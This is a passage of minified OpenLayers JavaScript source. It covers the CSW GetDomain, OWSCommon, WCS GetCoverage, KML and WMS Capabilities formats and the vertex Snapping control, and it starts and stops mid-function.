c=a.attributes,d={},e=0,f=c.length;e<f;++e)d[c[e].name]=c[e].nodeValue;this.readChildNodes(a,d);b.DomainValues.push(d)},PropertyName:function(a,b){b.PropertyName=this.getChildValue(a)},ParameterName:function(a,b){b.ParameterName=this.getChildValue(a)},ListOfValues:function(a,\nb){OpenLayers.Util.isArray(b.ListOfValues)||(b.ListOfValues=[]);this.readChildNodes(a,b.ListOfValues)},Value:function(a,b){for(var c=a.attributes,d={},e=0,f=c.length;e<f;++e)d[c[e].name]=c[e].nodeValue;d.value=this.getChildValue(a);b.push({Value:d})},ConceptualScheme:function(a,b){b.ConceptualScheme={};this.readChildNodes(a,b.ConceptualScheme)},Name:function(a,b){b.Name=this.getChildValue(a)},Document:function(a,b){b.Document=this.getChildValue(a)},Authority:function(a,b){b.Authority=this.getChildValue(a)},\nRangeOfValues:function(a,b){b.RangeOfValues={};this.readChildNodes(a,b.RangeOfValues)},MinValue:function(a,b){for(var c=a.attributes,d={},e=0,f=c.length;e<f;++e)d[c[e].name]=c[e].nodeValue;d.value=this.getChildValue(a);b.MinValue=d},MaxValue:function(a,b){for(var c=a.attributes,d={},e=0,f=c.length;e<f;++e)d[c[e].name]=c[e].nodeValue;d.value=this.getChildValue(a);b.MaxValue=d}}},write:function(a){a=this.writeNode(\"csw:GetDomain\",a);return OpenLayers.Format.XML.prototype.write.apply(this,[a])},writers:{csw:{GetDomain:function(a){var b=\nthis.createElementNSPlus(\"csw:GetDomain\",{attributes:{service:\"CSW\",version:this.version}});a.PropertyName||this.PropertyName?this.writeNode(\"csw:PropertyName\",a.PropertyName||this.PropertyName,b):(a.ParameterName||this.ParameterName)&&this.writeNode(\"csw:ParameterName\",a.ParameterName||this.ParameterName,b);this.readChildNodes(b,a);return b},PropertyName:function(a){return this.createElementNSPlus(\"csw:PropertyName\",{value:a})},ParameterName:function(a){return this.createElementNSPlus(\"csw:ParameterName\",\n{value:a})}}},CLASS_NAME:\"OpenLayers.Format.CSWGetDomain.v2_0_2\"});OpenLayers.Format.ArcXML.Features=OpenLayers.Class(OpenLayers.Format.XML,{read:function(a){return(new OpenLayers.Format.ArcXML).read(a).features.feature}});OpenLayers.Control.Snapping=OpenLayers.Class(OpenLayers.Control,{DEFAULTS:{tolerance:10,node:!0,edge:!0,vertex:!0},greedy:!0,precedence:[\"node\",\"vertex\",\"edge\"],resolution:null,geoToleranceCache:null,layer:null,feature:null,point:null,initialize:function(a){OpenLayers.Control.prototype.initialize.apply(this,[a]);this.options=a||{};this.options.layer&&this.setLayer(this.options.layer);a=OpenLayers.Util.extend({},this.options.defaults);this.defaults=OpenLayers.Util.applyDefaults(a,this.DEFAULTS);this.setTargets(this.options.targets);\n0===this.targets.length&&this.layer&&this.addTargetLayer(this.layer);this.geoToleranceCache={}},setLayer:function(a){this.active?(this.deactivate(),this.layer=a,this.activate()):this.layer=a},setTargets:function(a){this.targets=[];if(a&&a.length)for(var b,c=0,d=a.length;c<d;++c)b=a[c],b instanceof OpenLayers.Layer.Vector?this.addTargetLayer(b):this.addTarget(b)},addTargetLayer:function(a){this.addTarget({layer:a})},addTarget:function(a){a=OpenLayers.Util.applyDefaults(a,this.defaults);a.nodeTolerance=\na.nodeTolerance||a.tolerance;a.vertexTolerance=a.vertexTolerance||a.tolerance;a.edgeTolerance=a.edgeTolerance||a.tolerance;this.targets.push(a)},removeTargetLayer:function(a){for(var b,c=this.targets.length-1;0<=c;--c)b=this.targets[c],b.layer===a&&this.removeTarget(b)},removeTarget:function(a){return OpenLayers.Util.removeItem(this.targets,a)},activate:function(){var a=OpenLayers.Control.prototype.activate.call(this);if(a&&this.layer&&this.layer.events)this.layer.events.on({sketchstarted:this.onSketchModified,\nsketchmodified:this.onSketchModified,vertexmodified:this.onVertexModified,scope:this});return a},deactivate:function(){var a=OpenLayers.Control.prototype.deactivate.call(this);a&&this.layer&&this.layer.events&&this.layer.events.un({sketchstarted:this.onSketchModified,sketchmodified:this.onSketchModified,vertexmodified:this.onVertexModified,scope:this});this.point=this.feature=null;return a},onSketchModified:function(a){this.feature=a.feature;this.considerSnapping(a.vertex,a.vertex)},onVertexModified:function(a){this.feature=\na.feature;var b=this.layer.map.getLonLatFromViewPortPx(a.pixel);this.considerSnapping(a.vertex,new OpenLayers.Geometry.Point(b.lon,b.lat))},considerSnapping:function(a,b){for(var c={rank:Number.POSITIVE_INFINITY,dist:Number.POSITIVE_INFINITY,x:null,y:null},d=!1,e,f,g=0,h=this.targets.length;g<h;++g)if(f=this.targets[g],e=this.testTarget(f,b))if(this.greedy){c=e;c.target=f;d=!0;break}else if(e.rank<c.rank||e.rank===c.rank&&e.dist<c.dist)c=e,c.target=f,d=!0;d&&(!1!==this.events.triggerEvent(\"beforesnap\",\n{point:a,x:c.x,y:c.y,distance:c.dist,layer:c.target.layer,snapType:this.precedence[c.rank]})?(a.x=c.x,a.y=c.y,this.point=a,this.events.triggerEvent(\"snap\",{point:a,snapType:this.precedence[c.rank],layer:c.target.layer,distance:c.dist})):d=!1);this.point&&!d&&(a.x=b.x,a.y=b.y,this.point=null,this.events.triggerEvent(\"unsnap\",{point:a}))},testTarget:function(a,b){var c=this.layer.map.getResolution();if(\"minResolution\"in a&&c<a.minResolution||\"maxResolution\"in a&&c>=a.maxResolution)return null;for(var c=\n{node:this.getGeoTolerance(a.nodeTolerance,c),vertex:this.getGeoTolerance(a.vertexTolerance,c),edge:this.getGeoTolerance(a.edgeTolerance,c)},d=Math.max(c.node,c.vertex,c.edge),e={rank:Number.POSITIVE_INFINITY,dist:Number.POSITIVE_INFINITY},f=!1,g=a.layer.features,h,k,l,m,n,p,q=this.precedence.length,r=new OpenLayers.LonLat(b.x,b.y),s=0,t=g.length;s<t;++s)if(h=g[s],h!==this.feature&&(!h._sketch&&h.state!==OpenLayers.State.DELETE&&(!a.filter||a.filter.evaluate(h)))&&h.atPoint(r,d,d))for(var u=0,v=Math.min(e.rank+\n1,q);u<v;++u)if(k=this.precedence[u],a[k])if(\"edge\"===k){if(l=h.geometry.distanceTo(b,{details:!0}),n=l.distance,n<=c[k]&&n<e.dist){e={rank:u,dist:n,x:l.x0,y:l.y0};f=!0;break}}else{l=h.geometry.getVertices(\"node\"===k);p=!1;for(var w=0,x=l.length;w<x;++w)m=l[w],n=m.distanceTo(b),n<=c[k]&&(u<e.rank||u===e.rank&&n<e.dist)&&(e={rank:u,dist:n,x:m.x,y:m.y},p=f=!0);if(p)break}return f?e:null},getGeoTolerance:function(a,b){b!==this.resolution&&(this.resolution=b,this.geoToleranceCache={});var c=this.geoToleranceCache[a];\nvoid 0===c&&(c=a*b,this.geoToleranceCache[a]=c);return c},destroy:function(){this.active&&this.deactivate();delete this.layer;delete this.targets;OpenLayers.Control.prototype.destroy.call(this)},CLASS_NAME:\"OpenLayers.Control.Snapping\"});OpenLayers.Format.OWSCommon.v1_1_0=OpenLayers.Class(OpenLayers.Format.OWSCommon.v1,{namespaces:{ows:\"http://www.opengis.net/ows/1.1\",xlink:\"http://www.w3.org/1999/xlink\"},readers:{ows:OpenLayers.Util.applyDefaults({ExceptionReport:function(a,b){b.exceptionReport={version:a.getAttribute(\"version\"),language:a.getAttribute(\"xml:lang\"),exceptions:[]};this.readChildNodes(a,b.exceptionReport)},AllowedValues:function(a,b){b.allowedValues={};this.readChildNodes(a,b.allowedValues)},AnyValue:function(a,b){b.anyValue=\n!0},DataType:function(a,b){b.dataType=this.getChildValue(a)},Range:function(a,b){b.range={};this.readChildNodes(a,b.range)},MinimumValue:function(a,b){b.minValue=this.getChildValue(a)},MaximumValue:function(a,b){b.maxValue=this.getChildValue(a)},Identifier:function(a,b){b.identifier=this.getChildValue(a)},SupportedCRS:function(a,b){b.supportedCRS=this.getChildValue(a)}},OpenLayers.Format.OWSCommon.v1.prototype.readers.ows)},writers:{ows:OpenLayers.Util.applyDefaults({Range:function(a){var b=this.createElementNSPlus(\"ows:Range\",\n{attributes:{\"ows:rangeClosure\":a.closure}});this.writeNode(\"ows:MinimumValue\",a.minValue,b);this.writeNode(\"ows:MaximumValue\",a.maxValue,b);return b},MinimumValue:function(a){return this.createElementNSPlus(\"ows:MinimumValue\",{value:a})},MaximumValue:function(a){return this.createElementNSPlus(\"ows:MaximumValue\",{value:a})},Value:function(a){return this.createElementNSPlus(\"ows:Value\",{value:a})}},OpenLayers.Format.OWSCommon.v1.prototype.writers.ows)},CLASS_NAME:\"OpenLayers.Format.OWSCommon.v1_1_0\"});OpenLayers.Format.WCSGetCoverage=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{ows:\"http://www.opengis.net/ows/1.1\",wcs:\"http://www.opengis.net/wcs/1.1\",xlink:\"http://www.w3.org/1999/xlink\",xsi:\"http://www.w3.org/2001/XMLSchema-instance\"},regExes:{trimSpace:/^\\s*|\\s*$/g,removeSpace:/\\s*/g,splitSpace:/\\s+/,trimComma:/\\s*,\\s*/g},VERSION:\"1.1.2\",schemaLocation:\"http://www.opengis.net/wcs/1.1 http://schemas.opengis.net/wcs/1.1/wcsGetCoverage.xsd\",write:function(a){a=this.writeNode(\"wcs:GetCoverage\",\na);this.setAttributeNS(a,this.namespaces.xsi,\"xsi:schemaLocation\",this.schemaLocation);return OpenLayers.Format.XML.prototype.write.apply(this,[a])},writers:{wcs:{GetCoverage:function(a){var b=this.createElementNSPlus(\"wcs:GetCoverage\",{attributes:{version:a.version||this.VERSION,service:\"WCS\"}});this.writeNode(\"ows:Identifier\",a.identifier,b);this.writeNode(\"wcs:DomainSubset\",a.domainSubset,b);this.writeNode(\"wcs:Output\",a.output,b);return b},DomainSubset:function(a){var b=this.createElementNSPlus(\"wcs:DomainSubset\",\n{});this.writeNode(\"ows:BoundingBox\",a.boundingBox,b);a.temporalSubset&&this.writeNode(\"wcs:TemporalSubset\",a.temporalSubset,b);return b},TemporalSubset:function(a){for(var b=this.createElementNSPlus(\"wcs:TemporalSubset\",{}),c=0,d=a.timePeriods.length;c<d;++c)this.writeNode(\"wcs:TimePeriod\",a.timePeriods[c],b);return b},TimePeriod:function(a){var b=this.createElementNSPlus(\"wcs:TimePeriod\",{});this.writeNode(\"wcs:BeginPosition\",a.begin,b);this.writeNode(\"wcs:EndPosition\",a.end,b);a.resolution&&this.writeNode(\"wcs:TimeResolution\",\na.resolution,b);return b},BeginPosition:function(a){return this.createElementNSPlus(\"wcs:BeginPosition\",{value:a})},EndPosition:function(a){return this.createElementNSPlus(\"wcs:EndPosition\",{value:a})},TimeResolution:function(a){return this.createElementNSPlus(\"wcs:TimeResolution\",{value:a})},Output:function(a){var b=this.createElementNSPlus(\"wcs:Output\",{attributes:{format:a.format,store:a.store}});a.gridCRS&&this.writeNode(\"wcs:GridCRS\",a.gridCRS,b);return b},GridCRS:function(a){var b=this.createElementNSPlus(\"wcs:GridCRS\",\n{});this.writeNode(\"wcs:GridBaseCRS\",a.baseCRS,b);a.type&&this.writeNode(\"wcs:GridType\",a.type,b);a.origin&&this.writeNode(\"wcs:GridOrigin\",a.origin,b);this.writeNode(\"wcs:GridOffsets\",a.offsets,b);a.CS&&this.writeNode(\"wcs:GridCS\",a.CS,b);return b},GridBaseCRS:function(a){return this.createElementNSPlus(\"wcs:GridBaseCRS\",{value:a})},GridOrigin:function(a){return this.createElementNSPlus(\"wcs:GridOrigin\",{value:a})},GridType:function(a){return this.createElementNSPlus(\"wcs:GridType\",{value:a})},GridOffsets:function(a){return this.createElementNSPlus(\"wcs:GridOffsets\",\n{value:a})},GridCS:function(a){return this.createElementNSPlus(\"wcs:GridCS\",{value:a})}},ows:OpenLayers.Format.OWSCommon.v1_1_0.prototype.writers.ows},CLASS_NAME:\"OpenLayers.Format.WCSGetCoverage\"});OpenLayers.Format.KML=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{kml:\"http://www.opengis.net/kml/2.2\",gx:\"http://www.google.com/kml/ext/2.2\"},kmlns:\"http://earth.google.com/kml/2.0\",placemarksDesc:\"No description available\",foldersName:\"OpenLayers export\",foldersDesc:\"Exported on \"+new Date,extractAttributes:!0,kvpAttributes:!1,extractStyles:!1,extractTracks:!1,trackAttributes:null,internalns:null,features:null,styles:null,styleBaseUrl:\"\",fetched:null,maxDepth:0,initialize:function(a){this.regExes=\n{trimSpace:/^\\s*|\\s*$/g,removeSpace:/\\s*/g,splitSpace:/\\s+/,trimComma:/\\s*,\\s*/g,kmlColor:/(\\w{2})(\\w{2})(\\w{2})(\\w{2})/,kmlIconPalette:/root:\\/\\/icons\\/palette-(\\d+)(\\.\\w+)/,straightBracket:/\\$\\[(.*?)\\]/g};this.externalProjection=new OpenLayers.Projection(\"EPSG:4326\");OpenLayers.Format.XML.prototype.initialize.apply(this,[a])},read:function(a){this.features=[];this.styles={};this.fetched={};return this.parseData(a,{depth:0,styleBaseUrl:this.styleBaseUrl})},parseData:function(a,b){\"string\"==typeof a&&\n(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));for(var c=[\"Link\",\"NetworkLink\",\"Style\",\"StyleMap\",\"Placemark\"],d=0,e=c.length;d<e;++d){var f=c[d],g=this.getElementsByTagNameNS(a,\"*\",f);if(0!=g.length)switch(f.toLowerCase()){case \"link\":case \"networklink\":this.parseLinks(g,b);break;case \"style\":this.extractStyles&&this.parseStyles(g,b);break;case \"stylemap\":this.extractStyles&&this.parseStyleMaps(g,b);break;case \"placemark\":this.parseFeatures(g,b)}}return this.features},parseLinks:function(a,\nb){if(b.depth>=this.maxDepth)return!1;var c=OpenLayers.Util.extend({},b);c.depth++;for(var d=0,e=a.length;d<e;d++){var f=this.parseProperty(a[d],\"*\",\"href\");f&&!this.fetched[f]&&(this.fetched[f]=!0,(f=this.fetchLink(f))&&this.parseData(f,c))}},fetchLink:function(a){if(a=OpenLayers.Request.GET({url:a,async:!1}))return a.responseText},parseStyles:function(a,b){for(var c=0,d=a.length;c<d;c++){var e=this.parseStyle(a[c]);e&&(this.styles[(b.styleBaseUrl||\"\")+\"#\"+e.id]=e)}},parseKmlColor:function(a){var b=\nnull;a&&(a=a.match(this.regExes.kmlColor))&&(b={color:\"#\"+a[4]+a[3]+a[2],opacity:parseInt(a[1],16)/255});return b},parseStyle:function(a){for(var b={},c=[\"LineStyle\",\"PolyStyle\",\"IconStyle\",\"BalloonStyle\",\"LabelStyle\"],d,e,f=0,g=c.length;f<g;++f)if(d=c[f],e=this.getElementsByTagNameNS(a,\"*\",d)[0])switch(d.toLowerCase()){case \"linestyle\":d=this.parseProperty(e,\"*\",\"color\");if(d=this.parseKmlColor(d))b.strokeColor=d.color,b.strokeOpacity=d.opacity;(d=this.parseProperty(e,\"*\",\"width\"))&&(b.strokeWidth=\nd);break;case \"polystyle\":d=this.parseProperty(e,\"*\",\"color\");if(d=this.parseKmlColor(d))b.fillOpacity=d.opacity,b.fillColor=d.color;\"0\"==this.parseProperty(e,\"*\",\"fill\")&&(b.fillColor=\"none\");\"0\"==this.parseProperty(e,\"*\",\"outline\")&&(b.strokeWidth=\"0\");break;case \"iconstyle\":var h=parseFloat(this.parseProperty(e,\"*\",\"scale\")||1);d=32*h;var k=32*h,l=this.getElementsByTagNameNS(e,\"*\",\"Icon\")[0];if(l){var m=this.parseProperty(l,\"*\",\"href\");if(m){var n=this.parseProperty(l,\"*\",\"w\"),p=this.parseProperty(l,\n\"*\",\"h\");!OpenLayers.String.startsWith(m,\"http://maps.google.com/mapfiles/kml\")||(n||p)||(p=n=64,h/=2);n=n||p;p=p||n;n&&(d=parseInt(n)*h);p&&(k=parseInt(p)*h);if(p=m.match(this.regExes.kmlIconPalette))n=p[1],p=p[2],m=this.parseProperty(l,\"*\",\"x\"),l=this.parseProperty(l,\"*\",\"y\"),m=\"http://maps.google.com/mapfiles/kml/pal\"+n+\"/icon\"+(8*(l?7-l/32:7)+(m?m/32:0))+p;b.graphicOpacity=1;b.externalGraphic=m}}if(e=this.getElementsByTagNameNS(e,\"*\",\"hotSpot\")[0])m=parseFloat(e.getAttribute(\"x\")),l=parseFloat(e.getAttribute(\"y\")),\nn=e.getAttribute(\"xunits\"),\"pixels\"==n?b.graphicXOffset=-m*h:\"insetPixels\"==n?b.graphicXOffset=-d+m*h:\"fraction\"==n&&(b.graphicXOffset=-d*m),e=e.getAttribute(\"yunits\"),\"pixels\"==e?b.graphicYOffset=-k+l*h+1:\"insetPixels\"==e?b.graphicYOffset=-(l*h)+1:\"fraction\"==e&&(b.graphicYOffset=-k*(1-l)+1);b.graphicWidth=d;b.graphicHeight=k;break;case \"balloonstyle\":(e=OpenLayers.Util.getXmlNodeValue(e))&&(b.balloonStyle=e.replace(this.regExes.straightBracket,\"${$1}\"));break;case \"labelstyle\":if(d=this.parseProperty(e,\n\"*\",\"color\"),d=this.parseKmlColor(d))b.fontColor=d.color,b.fontOpacity=d.opacity}!b.strokeColor&&b.fillColor&&(b.strokeColor=b.fillColor);(a=a.getAttribute(\"id\"))&&b&&(b.id=a);return b},parseStyleMaps:function(a,b){for(var c=0,d=a.length;c<d;c++)for(var e=a[c],f=this.getElementsByTagNameNS(e,\"*\",\"Pair\"),e=e.getAttribute(\"id\"),g=0,h=f.length;g<h;g++){var k=f[g],l=this.parseProperty(k,\"*\",\"key\");(k=this.parseProperty(k,\"*\",\"styleUrl\"))&&\"normal\"==l&&(this.styles[(b.styleBaseUrl||\"\")+\"#\"+e]=this.styles[(b.styleBaseUrl||\n\"\")+k])}},parseFeatures:function(a,b){for(var c=[],d=0,e=a.length;d<e;d++){var f=a[d],g=this.parseFeature.apply(this,[f]);if(g){this.extractStyles&&(g.attributes&&g.attributes.styleUrl)&&(g.style=this.getStyle(g.attributes.styleUrl,b));if(this.extractStyles){var h=this.getElementsByTagNameNS(f,\"*\",\"Style\")[0];h&&(h=this.parseStyle(h))&&(g.style=OpenLayers.Util.extend(g.style,h))}this.extractTracks?(f=this.getElementsByTagNameNS(f,this.namespaces.gx,\"Track\"))&&0<f.length&&(g={features:[],feature:g},\nthis.readNode(f[0],g),0<g.features.length&&c.push.apply(c,g.features)):c.push(g)}else throw\"Bad Placemark: \"+d;}this.features=this.features.concat(c)},readers:{kml:{when:function(a,b){b.whens.push(OpenLayers.Date.parse(this.getChildValue(a)))},_trackPointAttribute:function(a,b){var c=a.nodeName.split(\":\").pop();b.attributes[c].push(this.getChildValue(a))}},gx:{Track:function(a,b){var c={whens:[],points:[],angles:[]};if(this.trackAttributes){var d;c.attributes={};for(var e=0,f=this.trackAttributes.length;e<\nf;++e)d=this.trackAttributes[e],c.attributes[d]=[],d in this.readers.kml||(this.readers.kml[d]=this.readers.kml._trackPointAttribute)}this.readChildNodes(a,c);if(c.whens.length!==c.points.length)throw Error(\"gx:Track with unequal number of when (\"+c.whens.length+\") and gx:coord (\"+c.points.length+\") elements.\");var g=0<c.angles.length;if(g&&c.whens.length!==c.angles.length)throw Error(\"gx:Track with unequal number of when (\"+c.whens.length+\") and gx:angles (\"+c.angles.length+\") elements.\");for(var h,\ne=0,f=c.whens.length;e<f;++e){h=b.feature.clone();h.fid=b.feature.fid||b.feature.id;d=c.points[e];h.geometry=d;\"z\"in d&&(h.attributes.altitude=d.z);this.internalProjection&&this.externalProjection&&h.geometry.transform(this.externalProjection,this.internalProjection);if(this.trackAttributes)for(var k=0,l=this.trackAttributes.length;k<l;++k)d=this.trackAttributes[k],h.attributes[d]=c.attributes[d][e];h.attributes.when=c.whens[e];h.attributes.trackId=b.feature.id;g&&(d=c.angles[e],h.attributes.heading=\nparseFloat(d[0]),h.attributes.tilt=parseFloat(d[1]),h.attributes.roll=parseFloat(d[2]));b.features.push(h)}},coord:function(a,b){var c=this.getChildValue(a).replace(this.regExes.trimSpace,\"\").split(/\\s+/),d=new OpenLayers.Geometry.Point(c[0],c[1]);2<c.length&&(d.z=parseFloat(c[2]));b.points.push(d)},angles:function(a,b){var c=this.getChildValue(a).replace(this.regExes.trimSpace,\"\").split(/\\s+/);b.angles.push(c)}}},parseFeature:function(a){for(var b=[\"MultiGeometry\",\"Polygon\",\"LineString\",\"Point\"],\nc,d,e,f=0,g=b.length;f<g;++f)if(c=b[f],this.internalns=a.namespaceURI?a.namespaceURI:this.kmlns,d=this.getElementsByTagNameNS(a,this.internalns,c),0<d.length){if(b=this.parseGeometry[c.toLowerCase()])e=b.apply(this,[d[0]]),this.internalProjection&&this.externalProjection&&e.transform(this.externalProjection,this.internalProjection);else throw new TypeError(\"Unsupported geometry type: \"+c);break}var h;this.extractAttributes&&(h=this.parseAttributes(a));c=new OpenLayers.Feature.Vector(e,h);a=a.getAttribute(\"id\")||\na.getAttribute(\"name\");null!=a&&(c.fid=a);return c},getStyle:function(a,b){var c=OpenLayers.Util.removeTail(a),d=OpenLayers.Util.extend({},b);d.depth++;d.styleBaseUrl=c;!this.styles[a]&&!OpenLayers.String.startsWith(a,\"#\")&&d.depth<=this.maxDepth&&!this.fetched[c]&&(c=this.fetchLink(c))&&this.parseData(c,d);return OpenLayers.Util.extend({},this.styles[a])},parseGeometry:{point:function(a){var b=this.getElementsByTagNameNS(a,this.internalns,\"coordinates\");a=[];if(0<b.length){var c=b[0].firstChild.nodeValue,\nc=c.replace(this.regExes.removeSpace,\"\");a=c.split(\",\")}b=null;if(1<a.length)2==a.length&&(a[2]=null),b=new OpenLayers.Geometry.Point(a[0],a[1],a[2]);else throw\"Bad coordinate string: \"+c;return b},linestring:function(a,b){var c=this.getElementsByTagNameNS(a,this.internalns,\"coordinates\"),d=null;if(0<c.length){for(var c=this.getChildValue(c[0]),c=c.replace(this.regExes.trimSpace,\"\"),c=c.replace(this.regExes.trimComma,\",\"),d=c.split(this.regExes.splitSpace),e=d.length,f=Array(e),g,h,k=0;k<e;++k)if(g=\nd[k].split(\",\"),h=g.length,1<h)2==g.length&&(g[2]=null),f[k]=new OpenLayers.Geometry.Point(g[0],g[1],g[2]);else throw\"Bad LineString point coordinates: \"+d[k];if(e)d=b?new OpenLayers.Geometry.LinearRing(f):new OpenLayers.Geometry.LineString(f);else throw\"Bad LineString coordinates: \"+c;}return d},polygon:function(a){a=this.getElementsByTagNameNS(a,this.internalns,\"LinearRing\");var b=a.length,c=Array(b);if(0<b)for(var d=0,e=a.length;d<e;++d)if(b=this.parseGeometry.linestring.apply(this,[a[d],!0]))c[d]=\nb;else throw\"Bad LinearRing geometry: \"+d;return new OpenLayers.Geometry.Polygon(c)},multigeometry:function(a){for(var b,c=[],d=a.childNodes,e=0,f=d.length;e<f;++e)a=d[e],1==a.nodeType&&(b=a.prefix?a.nodeName.split(\":\")[1]:a.nodeName,(b=this.parseGeometry[b.toLowerCase()])&&c.push(b.apply(this,[a])));return new OpenLayers.Geometry.Collection(c)}},parseAttributes:function(a){var b={},c=a.getElementsByTagName(\"ExtendedData\");c.length&&(b=this.parseExtendedData(c[0]));var d,e,f;a=a.childNodes;for(var c=\n0,g=a.length;c<g;++c)if(d=a[c],1==d.nodeType&&(e=d.childNodes,1<=e.length&&3>=e.length)){switch(e.length){case 1:f=e[0];break;case 2:f=e[0];e=e[1];f=3==f.nodeType||4==f.nodeType?f:e;break;default:f=e[1]}if(3==f.nodeType||4==f.nodeType)if(d=d.prefix?d.nodeName.split(\":\")[1]:d.nodeName,f=OpenLayers.Util.getXmlNodeValue(f))f=f.replace(this.regExes.trimSpace,\"\"),b[d]=f}return b},parseExtendedData:function(a){var b={},c,d,e,f,g=a.getElementsByTagName(\"Data\");c=0;for(d=g.length;c<d;c++){e=g[c];f=e.getAttribute(\"name\");\nvar h={},k=e.getElementsByTagName(\"value\");k.length&&(h.value=this.getChildValue(k[0]));this.kvpAttributes?b[f]=h.value:(e=e.getElementsByTagName(\"displayName\"),e.length&&(h.displayName=this.getChildValue(e[0])),b[f]=h)}a=a.getElementsByTagName(\"SimpleData\");c=0;for(d=a.length;c<d;c++)h={},e=a[c],f=e.getAttribute(\"name\"),h.value=this.getChildValue(e),this.kvpAttributes?b[f]=h.value:(h.displayName=f,b[f]=h);return b},parseProperty:function(a,b,c){var d;a=this.getElementsByTagNameNS(a,b,c);try{d=OpenLayers.Util.getXmlNodeValue(a[0])}catch(e){d=\nnull}return d},write:function(a){OpenLayers.Util.isArray(a)||(a=[a]);for(var b=this.createElementNS(this.kmlns,\"kml\"),c=this.createFolderXML(),d=0,e=a.length;d<e;++d)c.appendChild(this.createPlacemarkXML(a[d]));b.appendChild(c);return OpenLayers.Format.XML.prototype.write.apply(this,[b])},createFolderXML:function(){var a=this.createElementNS(this.kmlns,\"Folder\");if(this.foldersName){var b=this.createElementNS(this.kmlns,\"name\"),c=this.createTextNode(this.foldersName);b.appendChild(c);a.appendChild(b)}this.foldersDesc&&\n(b=this.createElementNS(this.kmlns,\"description\"),c=this.createTextNode(this.foldersDesc),b.appendChild(c),a.appendChild(b));return a},createPlacemarkXML:function(a){var b=this.createElementNS(this.kmlns,\"name\"),c=a.style&&a.style.label?a.style.label:a.id;b.appendChild(this.createTextNode(a.attributes.name||c));var d=this.createElementNS(this.kmlns,\"description\");d.appendChild(this.createTextNode(a.attributes.description||this.placemarksDesc));c=this.createElementNS(this.kmlns,\"Placemark\");null!=\na.fid&&c.setAttribute(\"id\",a.fid);c.appendChild(b);c.appendChild(d);b=this.buildGeometryNode(a.geometry);c.appendChild(b);a.attributes&&(a=this.buildExtendedData(a.attributes))&&c.appendChild(a);return c},buildGeometryNode:function(a){var b=a.CLASS_NAME,b=b.substring(b.lastIndexOf(\".\")+1),b=this.buildGeometry[b.toLowerCase()],c=null;b&&(c=b.apply(this,[a]));return c},buildGeometry:{point:function(a){var b=this.createElementNS(this.kmlns,\"Point\");b.appendChild(this.buildCoordinatesNode(a));return b},\nmultipoint:function(a){return this.buildGeometry.collection.apply(this,[a])},linestring:function(a){var b=this.createElementNS(this.kmlns,\"LineString\");b.appendChild(this.buildCoordinatesNode(a));return b},multilinestring:function(a){return this.buildGeometry.collection.apply(this,[a])},linearring:function(a){var b=this.createElementNS(this.kmlns,\"LinearRing\");b.appendChild(this.buildCoordinatesNode(a));return b},polygon:function(a){var b=this.createElementNS(this.kmlns,\"Polygon\");a=a.components;\nfor(var c,d,e=0,f=a.length;e<f;++e)c=0==e?\"outerBoundaryIs\":\"innerBoundaryIs\",c=this.createElementNS(this.kmlns,c),d=this.buildGeometry.linearring.apply(this,[a[e]]),c.appendChild(d),b.appendChild(c);return b},multipolygon:function(a){return this.buildGeometry.collection.apply(this,[a])},collection:function(a){for(var b=this.createElementNS(this.kmlns,\"MultiGeometry\"),c,d=0,e=a.components.length;d<e;++d)(c=this.buildGeometryNode.apply(this,[a.components[d]]))&&b.appendChild(c);return b}},buildCoordinatesNode:function(a){var b=\nthis.createElementNS(this.kmlns,\"coordinates\"),c;if(c=a.components){for(var d=c.length,e=Array(d),f=0;f<d;++f)a=c[f],e[f]=this.buildCoordinates(a);c=e.join(\" \")}else c=this.buildCoordinates(a);c=this.createTextNode(c);b.appendChild(c);return b},buildCoordinates:function(a){this.internalProjection&&this.externalProjection&&(a=a.clone(),a.transform(this.internalProjection,this.externalProjection));return a.x+\",\"+a.y},buildExtendedData:function(a){var b=this.createElementNS(this.kmlns,\"ExtendedData\"),\nc;for(c in a)if(a[c]&&\"name\"!=c&&\"description\"!=c&&\"styleUrl\"!=c){var d=this.createElementNS(this.kmlns,\"Data\");d.setAttribute(\"name\",c);var e=this.createElementNS(this.kmlns,\"value\");if(\"object\"==typeof a[c]){if(a[c].value&&e.appendChild(this.createTextNode(a[c].value)),a[c].displayName){var f=this.createElementNS(this.kmlns,\"displayName\");f.appendChild(this.getXMLDoc().createCDATASection(a[c].displayName));d.appendChild(f)}}else e.appendChild(this.createTextNode(a[c]));d.appendChild(e);b.appendChild(d)}return this.isSimpleContent(b)?\nnull:b},CLASS_NAME:\"OpenLayers.Format.KML\"});OpenLayers.Format.WMSCapabilities=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,{defaultVersion:\"1.1.1\",profile:null,CLASS_NAME:\"OpenLayers.Format.WMSCapabilities\"});OpenLayers.Format.WMSCapabilities.v1=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{wms:\"http://www.opengis.net/wms\",xlink:\"http://www.w3.org/1999/xlink\",xsi:\"http://www.w3.org/2001/XMLSchema-instance\"},defaultPrefix:\"wms\",read:function(a){\"string\"==typeof a&&(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));var b=a;a&&9==a.nodeType&&(a=a.documentElement);var c={};this.readNode(a,c);void 0===c.service&&(a=new OpenLayers.Format.OGCExceptionReport,c.error=a.read(b));return c},readers:{wms:{Service:function(a,\nb){b.service={};this.readChildNodes(a,b.service)},Name:function(a,b){b.name=this.getChildValue(a)},Title:function(a,b){b.title=this.getChildValue(a)},Abstract:function(a,b){b[\"abstract\"]=this.getChildValue(a)},BoundingBox:function(a,b){var c={};c.bbox=[parseFloat(a.getAttribute(\"minx\")),parseFloat(a.getAttribute(\"miny\")),parseFloat(a.getAttribute(\"maxx\")),parseFloat(a.getAttribute(\"maxy\"))];var d={x:parseFloat(a.getAttribute(\"resx\")),y:parseFloat(a.getAttribute(\"resy\"))};isNaN(d.x)&&isNaN(d.y)||(c.res=\nd);return 